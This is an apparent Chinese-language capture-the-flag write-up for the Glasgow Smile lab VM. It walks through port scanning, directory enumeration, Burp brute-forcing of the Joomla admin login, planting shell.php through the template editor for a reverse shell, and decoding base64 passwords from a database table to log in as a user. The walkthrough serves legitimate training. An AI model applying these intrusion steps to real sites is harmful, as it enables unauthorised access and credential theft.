
## 端口扫描
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sudo nmap -sT -sCV -O -p 22,80 192.168.10.176
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-06 21:16 EDT
Nmap scan report for 192.168.10.176
Host is up (0.00085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:1D:88:A4 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
```

## web渗透

通过目录扫描得到一个目录

/joomla               (Status: 301) [Size: 317] [--> http://192.168.10.176/joomla/]

找到目录后继续二级目录探测
```bash
---- Scanning URL: http://192.168.10.176/joomla/ ----
==> DIRECTORY: http://192.168.10.176/joomla/administrator/
==> DIRECTORY: http://192.168.10.176/joomla/bin/
==> DIRECTORY: http://192.168.10.176/joomla/cache/
==> DIRECTORY: http://192.168.10.176/joomla/components/
==> DIRECTORY: http://192.168.10.176/joomla/images/
==> DIRECTORY: http://192.168.10.176/joomla/includes/
+ http://192.168.10.176/joomla/index.php (CODE:200|SIZE:10013)
==> DIRECTORY: http://192.168.10.176/joomla/language/
==> DIRECTORY: http://192.168.10.176/joomla/layouts/
==> DIRECTORY: http://192.168.10.176/joomla/libraries/
==> DIRECTORY: http://192.168.10.176/joomla/media/
==> DIRECTORY: http://192.168.10.176/joomla/modules/
==> DIRECTORY: http://192.168.10.176/joomla/plugins/
+ http://192.168.10.176/joomla/robots.txt (CODE:200|SIZE:836)
==> DIRECTORY: http://192.168.10.176/joomla/templates/
==> DIRECTORY: http://192.168.10.176/joomla/tmp/
```
找到如上一些目录
![](images/2024-04-07-09-39-11.png)
看下robots.txt
其中也有不少目录
搜集一下信息，感觉这靶机做的不是很好
登录名是joomla，没有任何提示
密码是通过cewl生成的密码本中的一个
就这样过吧

这里想用hydra爆破，但是其实是不可行的
Joomla 身份验证无法使用 Hydra 进行暴力破解，因为令牌身份不断变化

老老实实burp爆破
![](images/2024-04-07-10-59-29.png)
s's
找到模板文件
![](images/2024-04-07-10-58-31.png)
可以编辑源代码
![](images/2024-04-07-10-57-13.png)
之后添加了一个shell.php
访问
http://192.168.10.176/joomla/templates/protostar/shell.php
得到反弹shell

## 提权

![](images/2024-04-07-13-47-24.png)
文件太多了，用蚁剑连了一下
看到该文件含有数据库信息
直接登录
得到用户密码
```bash
select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
```
Bane:baneishere
Aaron:aaronishere
Carnage:carnageishere
buster:busterishereff
rob:???AllIHaveAreNegativeThoughts???
aunt:auntis the fuck here

### 垂直提权至rob

```bash
rob@glasgowsmile:~$ whoami
rob
rob@glasgowsmile:~$ ls -la
total 52
drwxr-xr-x 3 rob  rob  4096 Jun 16  2020 .
drwxr-xr-x 5 root root 4096 Jun 15  2020 ..
-rw-r----- 1 rob  rob   454 Jun 14  2020 Abnerineedyourhelp
-rw------- 1 rob  rob     7 Apr  6 20:12 .bash_history
-rw-r--r-- 1 rob  rob   220 Jun 13  2020 .bash_logout
-rw-r--r-- 1 rob  rob  3526 Jun 13  2020 .bashrc
-rw-r----- 1 rob  rob   313 Jun 14  2020 howtoberoot
drwxr-xr-x 3 rob  rob  4096 Jun 13  2020 .local
-rw------- 1 rob  rob    81 Jun 15  2020 .mysql_history
-rw-r--r-- 1 rob  rob   807 Jun 13  2020 .profile
-rw-r--r-- 1 rob  rob    66 Jun 15  2020 .selected_editor
-rw-r----- 1 rob  rob    38 Jun 13  2020 user.txt
-rw------- 1 rob  rob   429 Jun 16  2020 .Xauthority
rob@glasgowsmile:~$ cat user.txt
JKR[f5bb11acbb957915e421d62e7253d27a]
rob@glasgowsmile:~$
```
